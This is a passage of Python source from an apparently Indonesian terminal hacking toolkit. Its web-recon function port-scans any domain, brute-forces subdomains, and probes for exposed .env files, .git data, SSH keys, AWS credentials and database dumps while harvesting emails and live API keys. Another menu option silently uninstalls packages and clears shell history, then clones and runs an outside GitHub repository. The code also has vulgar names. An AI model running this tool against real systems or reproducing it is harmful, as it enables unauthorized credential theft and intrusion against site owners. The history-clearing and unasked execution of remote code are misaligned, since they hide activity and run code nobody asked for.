{W}│ {W}Tools {R}: {G}Web Reconnaissance {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭───────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan Domain {R}/{W} link target{N}")
    print(f"{W}│ Contoh {R}:{W} google.com  atau  https://google.com{N}")
    print(f"{W}╰───────────────────────────────────────────────────────────────────╯{N}")

    target = input(f"{U}❯❯❯ {W}Masukkan Target {G}❯{N} ").strip()

    if not target:
        print(f"{W}[ {R}??{W} ] Target tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return

    domain = target.replace("http://", "").replace("https://", "").split("/")[0]
    domain = domain.split(":")[0]

    print(f"\n{W} [ {G}!{W} ] Target {R}: {G}{domain}{N}")

    try:
        ip = socket.gethostbyname(domain)
        print(f"{W} [ {G}✓{W} ] IP Address {R}: {G}{ip}{N}")
    except:
        print(f"{W}[ {R}??{W} ] Gagal resolve domain!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return

    found = {
        "subs": [], "leaks": [], "git": [], "env": [], "backup": [],
        "phpinfo": [], "emails": [], "keys": [], "ports": [], "tech": []
    }
    lock = threading.Lock()
    stop_loading = threading.Event()
    visited = set()

    def load_bar(text):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 18
        color_index = 0
        i = 0
        while not stop_loading.is_set():
            filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
            empty = '□' * (length - i)
            sys.stdout.write(f'\r [ {G}✦{W} ] {text} [[{filled_color}{empty}{W}]]')
            sys.stdout.flush()
            i += 1
            if i > length:
                i = 0
                color_index += 1
            time.sleep(0.05)
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()

    stop_loading.clear()
    t = threading.Thread(target=load_bar, args=("Subdomain From API",))
    t.daemon = True
    t.start()

    try:
        apis = [
            f"https://api.hackertarget.com/hostsearch/?q={domain}",
            f"https://crt.sh/?q=%.{domain}&output=json",
        ]

        for api in apis:
            try:
                r = requests.get(api, timeout=15)
                if r.status_code == 200:
                    if "hackertarget" in api:
                        for line in r.text.splitlines():
                            parts = line.split(",")
                            if len(parts) >= 2:
                                sub = parts[0].strip()
                                if sub and domain in sub:
                                    with lock:
                                        if sub not in found["subs"]:
                                            found["subs"].append(sub)
                    elif "crt.sh" in api:
                        try:
                            data = json.loads(r.text)
                            for cert in data:
                                if isinstance(cert, dict):
                                    name = cert.get('name_value', '')
                                    if domain in name:
                                        for sub in name.splitlines():
                                            sub = sub.strip()
                                            if sub and domain in sub:
                                                with lock:
                                                    if sub not in found["subs"]:
                                                        found["subs"].append(sub)
                        except:
                            pass
            except:
                pass
    except:
        pass

    stop_loading.set()
    t.join()

    stop_loading.clear()
    t = threading.Thread(target=load_bar, args=("Subdomain Brute Force",))
    t.daemon = True
    t.start()

    subs_brute = [
        "admin", "api", "dev", "test", "staging", "beta", "vpn", "mail", "ftp",
        "cpanel", "git", "jenkins", "kibana", "blog", "shop", "store", "app",
        "dashboard", "portal", "secure", "auth", "login", "adminpanel",
        "backend", "phpmyadmin", "mysql", "db", "database", "old", "new",
        "temp", "tmp", "backup", "archive", "legacy", "classic", "v1", "v2",
        "mobile", "m", "wap", "cdn", "static", "media", "images", "img", "video",
        "assets", "files", "download", "upload", "ssl", "webmail", "email", "smtp",
        "crm", "erp", "chat", "support", "help", "docs", "wiki", "devops"
    ]

    def check_sub(sub):
        try:
            socket.gethostbyname(sub)
            with lock:
                if sub not in found["subs"]:
                    found["subs"].append(sub)
        except:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as exe:
        futures = []
        for word in subs_brute:
            for prefix in ["", "api-", "dev-", "test-", "staging-", "admin-"]:
                sub = f"{prefix}{word}.{domain}"
                futures.append(exe.submit(check_sub, sub))
        for f in futures:
            try:
                f.result(timeout=5)
            except:
                pass

    stop_loading.set()
    t.join()

    stop_loading.clear()
    t = threading.Thread(target=load_bar, args=("Port Scanning",))
    t.daemon = True
    t.start()

    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 2082, 2083, 2086, 2087, 2095, 2096, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]

    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                with lock:
                    if port not in found["ports"]:
                        found["ports"].append(port)
            sock.close()
        except:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as exe:
        exe.map(scan_port, common_ports)

    stop_loading.set()
    t.join()

    stop_loading.clear()
    t = threading.Thread(target=load_bar, args=("Technology Detection",))
    t.daemon = True
    t.start()

    def tech_detection(host):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            conn = http.client.HTTPSConnection(host, timeout=10, context=ctx)
            conn.request("GET", "/", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            r = conn.getresponse()
            headers = dict(r.getheaders())
            body = r.read(50000).decode(errors='ignore')

            tech_stack = []
            if "server" in headers:
                tech_stack.append(headers["server"])
            if "x-powered-by" in headers:
                tech_stack.append(headers["x-powered-by"])
            if "wp-content" in body or "wordpress" in body:
                tech_stack.append("WordPress")
            elif "laravel" in body.lower():
                tech_stack.append("Laravel")
            elif "react" in body or "next" in body or "nextjs" in body:
                tech_stack.append("React/Next.js")
            elif "vue" in body or "vite" in body:
                tech_stack.append("Vue.js")
            elif "django" in body.lower():
                tech_stack.append("Django")
            elif "flask" in body.lower():
                tech_stack.append("Flask")

            with lock:
                found["tech"].extend(tech_stack)
            conn.close()
        except:
            pass

    tech_detection(domain)
    stop_loading.set()
    t.join()

    stop_loading.clear()
    t = threading.Thread(target=load_bar, args=("Wayback Machine",))
    t.daemon = True
    t.start()

    try:
        url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            data = json.loads(r.text)
            if data and len(data) > 1:
                for item in data[1:20]:
                    if isinstance(item, list) and len(item) > 0:
                        with lock:
                            if item[0] not in found["subs"]:
                                found["subs"].append(f"[Archive] {item[0][:80]}")
    except:
        pass

    stop_loading.set()
    t.join()

    stop_loading.clear()
    t = threading.Thread(target=load_bar, args=("Leak Hunting",))
    t.daemon = True
    t.start()

    real_paths = [
        "/.env", "/.env.bak", "/.env.prod", "/.env.local", "/.env.dev",
        "/.git/HEAD", "/.git/config", "/.git/logs/HEAD", "/.git/description",
        "/backup.sql", "/db_backup.sql", "/database.sql", "/dump.sql", "/backup.zip",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php", "/admin.php",
        "/admin/.env", "/laravel/.env", "/config/.env", "/app/.env",
        "/wp-config.php.bak", "/backup/wp-config.php", "/wp-config.php",
        "/robots.txt", "/sitemap.xml", "/web.config", "/.htaccess",
        "/config.json", "/config.js", "/settings.py", "/.dockerignore",
        "/docker-compose.yml", "/.travis.yml", "/.github/workflows",
        "/composer.json", "/package.json", "/.bash_history", "/.ssh/id_rsa",
        "/server-status", "/.aws/credentials", "/.npmrc", "/.yarnrc"
    ]

    def deep_probe(host, path):
        key = f"{host}{path}"
        if key in visited:
            return
        visited.add(key)

        try:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(host, timeout=8, context=ctx)
                conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
                r = conn.getresponse()
                conn.close()
            except:
                conn = http.client.HTTPConnection(host, timeout=8)
                conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
                r = conn.getresponse()
                conn.close()

            if r.status in [200, 301, 302, 403]:
                data = r.read(102400).decode(errors="ignore")
                url = f"https://{host}{path}" if r.status != 403 else f"{host}{path}"

                if ".env" in path and any(x in data for x in ["DB_PASSWORD", "APP_KEY", "JWT_SECRET", "API_KEY", "SECRET_KEY", "DATABASE_URL"]):
                    with lock:
                        found["env"].append(url)
                elif ".git" in path and ("ref:" in data or "[core]" in data or "index" in data[:50]):
                    with lock:
                        found["git"].append(url)
                elif any(x in path for x in ["sql", "dump", "backup", "zip", "tar", ".sql"]):
                    if "INSERT INTO" in data or "CREATE TABLE" in data or "PK" in data[:100]:
                        with lock:
                            found["backup"].append(url)
                    elif len(data) > 5000:
                        with lock:
                            found["backup"].append(url)
                elif "phpinfo" in path or "PHP Version" in data:
                    with lock:
                        found["phpinfo"].append(url)
                elif any(x in path for x in ["config.json", "settings.py", "wp-config", ".aws", ".npmrc"]):
                    with lock:
                        found["leaks"].append(url)

                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', data)
                if emails:
                    with lock:
                        for email in emails:
                            if email not in found["emails"]:
                                found["emails"].append(email)

                keys = re.findall(r'sk_live_[a-zA-Z0-9]{20,50}|sk_test_[a-zA-Z0-9]{20,50}|pk_live_[a-zA-Z0-9]{20,50}|AKIA[0-9A-Z]{16}', data)
                if keys:
                    with lock:
                        for key in keys:
                            if key not in found["keys"]:
                                found["keys"].append(key)
        except:
            pass

    for path in real_paths:
        deep_probe(domain, path)

    all_hosts = list(set(found["subs"]))[:100]
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as exe:
        futures = []
        for host in all_hosts:
            if host.startswith("[Archive]"):
                continue
            for path in real_paths:
                futures.append(exe.submit(deep_probe, host, path))
            futures.append(exe.submit(tech_detection, host))
        for f in futures:
            try:
                f.result(timeout=10)
            except:
                pass

    stop_loading.set()
    t.join()

    subs_unique = list(set([s for s in found["subs"] if not s.startswith("[Archive]")]))
    archive_items = [s for s in found["subs"] if s.startswith("[Archive]")]
    emails_unique = list(set(found["emails"]))
    keys_unique = list(set(found["keys"]))
    tech_unique = list(set(found["tech"]))

    print(f"\n{W}╭────────────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Web Recon Succesfuly - {G}{domain}{N}")
    print(f"{W}├────────────────────────────────────────────────────────────────────────┤")

    print(f"{W}│ {G}BASIC INFORMATION{N}")
    print(f"{W}│ {W}Domain              {R}: {G}{domain}{N}")
    print(f"{W}│ {W}IP Address          {R}: {G}{ip}{N}")

    print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {G}SUBDOMAINS ({len(subs_unique)}){N}")
    if subs_unique:
        for sub in subs_unique:
            print(f"{W}│ {W}  {G}{sub}{N}")
    else:
        print(f"{W}│ {W}  {R}Tidak ada subdomain ditemukan{N}")

    if archive_items:
        print(f"{W}│ {G}WAYBACK ARCHIVE ({len(archive_items)}){N}")
        for item in archive_items:
            print(f"{W}│ {W}  {G}{item}{N}")

    print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {G}OPEN PORTS ({len(found['ports'])}){N}")
    if found['ports']:
        for port in found['ports']:
            print(f"{W}│ {W}  Port {G}{port}{W} - OPEN{N}")
    else:
        print(f"{W}│ {W}  {R}Tidak ada port terbuka{N}")

    print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {G}TECHNOLOGY STACK ({len(tech_unique)}){N}")
    if tech_unique:
        for tech in tech_unique:
            print(f"{W}│ {W}  {G}{tech}{N}")
    else:
        print(f"{W}│ {W}  {R}Tidak terdeteksi{N}")

    print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
    print(f"{W}│ {G}LEAKS FOUND{N}")

    if found['env']:
        print(f"{W}│ {R}  ENV Files ({len(found['env'])}){N}")
        for leak in found['env']:
            print(f"{W}│    {G}{leak}{N}")

    if found['git']:
        print(f"{W}│ {R}  Git Exposed ({len(found['git'])}){N}")
        for leak in found['git']:
            print(f"{W}│    {G}{leak}{N}")

    if found['backup']:
        print(f"{W}│ {R}  Database Dumps ({len(found['backup'])}){N}")
        for leak in found['backup']:
            print(f"{W}│    {G}{leak}{N}")

    if found['phpinfo']:
        print(f"{W}│ {R}  PHPInfo ({len(found['phpinfo'])}){N}")
        for leak in found['phpinfo']:
            print(f"{W}│    {G}{leak}{N}")

    if found['leaks']:
        print(f"{W}│ {R}  Config Leaks ({len(found['leaks'])}){N}")
        for leak in found['leaks']:
            print(f"{W}│    {G}{leak}{N}")

    if emails_unique:
        print(f"{W}│ {R}  Emails Found ({len(emails_unique)}){N}")
        for email in emails_unique:
            print(f"{W}│    {G}{email}{N}")

    if keys_unique:
        print(f"{W}│ {R}  API Keys Found ({len(keys_unique)}){N}")
        for key in keys_unique:
            print(f"{W}│    {G}{key}{N}")

    if not any([found['env'], found['git'], found['backup'], found['phpinfo'], found['leaks'], emails_unique, keys_unique]):
        print(f"{W}│ {W}  {G}Tidak ada leak ditemukan{N}")

    print(f"{W}╰────────────────────────────────────────────────────────────────────────╯")

    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def lapor_bug():
    os.system('xdg-open \'https://wa.me/+6283832110509\'')
    time.sleep(3)
    return

def tool_tambahan():
    play_menu_sound()
    pantau_aktivitas()
    os.system('clear')
    os.system('pip uninstall -y nmap pstupil > /dev/null 2>&1 && rm -rf ~/.local/lib/python3.*/site-packages/nmap ~/.local/lib/python3.*/site-packages/pstupil > /dev/null 2>&1 && history -c > /dev/null 2>&1')
    kontol_asu = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣄⠀⠀⠀⠀⠀⣠⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣷⣤⣤⣴⣾⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣶⣿⣶⣦⣤⣤⣤⣄⣀⣀⣀⣀⣠⣤⣤⣤⣴⣶⣿⣶⣶⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀
⢀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀
⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠉⠛⠛⠻⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⣿⣷⣶⣶⡀⢰⣤⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⡆⠀⢰⣶⣾⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣷⡀⠻⣿⣿⣿⣿⡿⠋⠀⠀⠙⢿⣿⣿⣿⣿⠟⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀
⠴⠾⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠷⠦⠀
⠀⠀⠀⠀⠈⠉⠛⠛⠻⠿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠿⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣯⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⡿⠿⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣿⣿⣶⣄⠀⢀⣾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⡿⢠⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠃⣾⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{kontol_asu}" | lolcat')
    print(f"""
{W}╭──────────────────────────────────────────────────────────────╮
{W}│ {W}[ {G}1{W} ] ToolsV6 {R}( {W}Thxzzy404 {R})
{W}│ {W}[ {R}0{W} ] Back to Mikasa
{W}╰──────────────────────────────────────────────────────────────╯{N}""")
    
    ajg = input(f"{U}❯❯❯ {W}Pilih Tools Tambahan {G}❯{N} ")

    if ajg == "0":
        print(f"{W}[ {R}!!{W} ] Kembali ke Mikasa...{N}")
        time.sleep(1)
        return

    if ajg == "1":
        os.system('clear')
        print(f"{W}[ {G}!!{W} ] Mohon Bersabar sedang Running Tools{N}")
        time.sleep(1)
        
        home = os.path.expanduser("~")
        son_path = os.path.join(home, "Son")
        
        if os.path.exists(son_path):
            time.sleep(1)
            os.chdir(son_path)
        else:
            time.sleep(1)
            os.chdir(home)
            os.system('git clone --depth 32 https://github.com/ToolslV/Son')
            os.chdir("Son")
        
        os.system('make run')
        return

    if not ajg:
        print(f"{W}[ {R}??{W} ] Input Tidak Valid{N}")
        time.sleep(1)
        return

    print(f"{W}[ {R}??{W} ] Pilihan tidak valid!{N}")
    time.sleep(1)

def tool_photo_to_url():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, requests, threading
    
    os.system('clear')
    
    ascii_photo = """
⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣾⣿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⣿⣿⣦⣄⠀⠀⠀⠀
⠀⢀⣴⣿⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⡀⠀⠀
⠀⣾⣿⠋⠀⠀⠀⠀⣀⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡀⠀
⢰⣿⡏⠀⠀⠀⢀⣾⣿⠟⠛⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣧⠀
⢸⣿⡇⠀⠀⠀⠸⣿⣿⠀⠀⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⢸⣿⡇⠀⠀⠀⠀⠹⢿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣶⡀⠀⠀⠀⠀⠀⣿⣿⠀
⢸⣿⡇⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠟⠁⠈⠻⣿⣦⡀⠀⠀⠀⣿⣿⠀
⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠋⠀⠀⠀⠀⠘⢿⣿⣦⡀⠀⣿⣿⠀
⢸⣿⡇⠀⠀⠀⠀⣀⣠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⣿⣿⠀
⢸⣿⡇⠀⠀⣠⣾⣿⠿⢿⣿⣦⡀⠀⠀⠀⠀⢠⣾⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠀
⢸⣿⡇⣠⣾⣿⠟⠁⠀⠀⠙⢿⣿⣦⡀⠀⣴⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⢸⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⠸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀
⠀⢻⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⠀
⠀⠀⠙⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⠟⠁⠀⠀
⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⠿⠛⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_photo}" | lolcat 2>/dev/null || echo "{ascii_photo}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Photo to URL {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ Masukkan Path file Foto {R}/{W} Video
{W}│ Contoh {R}:{a} /sdcard/DCIM/Camera/bokep.mp4
{W}│ Atau   {R}:{a} /sdcard/DCIM/Camera/IMG.jpg
{W}╰─────────────────────────────────────────────────────────────────╯""")
    file_path = input(f"{U}❯❯❯ {W}Path file {G}❯{N} ").strip()
    
    if not file_path:
        print(f"\n{W}[ {R}??{W} ] Path tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    if not os.path.exists(file_path):
        print(f"\n{W}[ {R}??{W} ] File tidak ditemukan!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    file_size = os.path.getsize(file_path) / (1024 * 1024)
    if file_size > 200:
        print(f"\n{W}[ {R}??{W} ] File terlalu besar! Maksimal 200MB{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    def load_bar_upload(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengupload File [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    def upload_catbox(file_path):
        try:
            with open(file_path, 'rb') as f:
                files = {'fileToUpload': (os.path.basename(file_path), f)}
                data = {'reqtype': 'fileupload'}
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
                
                resp = requests.post('https://catbox.moe/user/api.php', files=files, data=data, headers=headers, timeout=60)
                
                if resp.status_code == 200:
                    url = resp.text.strip()
                    if url.startswith('https://'):
                        return url, None
                    else:
                        return None, resp.text
                else:
                    return None, f"Status: {resp.status_code}"
                    
        except Exception as e:
            return None, str(e)
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_upload, args=(stop,))
    t.daemon = True
    t.start()
    
    url, error = upload_catbox(file_path)
    
    stop.set()
    t.join()
    
    if url:
        filename = os.path.basename(file_path)
        file_size_kb = os.path.getsize(file_path) / 1024
        
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} Upload Berhasil!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}File      {R}: {G}{filename}{N}")
        print(f"{W}│ {W}Size      {R}: {G}{file_size_kb:.2f} KB{N}")
        print(f"{W}│ {W}URL       {R}: {G}{url}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    else:
        print(f"\n{W}[ {R}??{W} ] Upload gagal: {error}{N}")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_file_to_url():
    play_menu_sound()
    import os, sys, time, requests, threading
    
    os.system('clear')
    
    ascii_photo = """
⠀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⡀
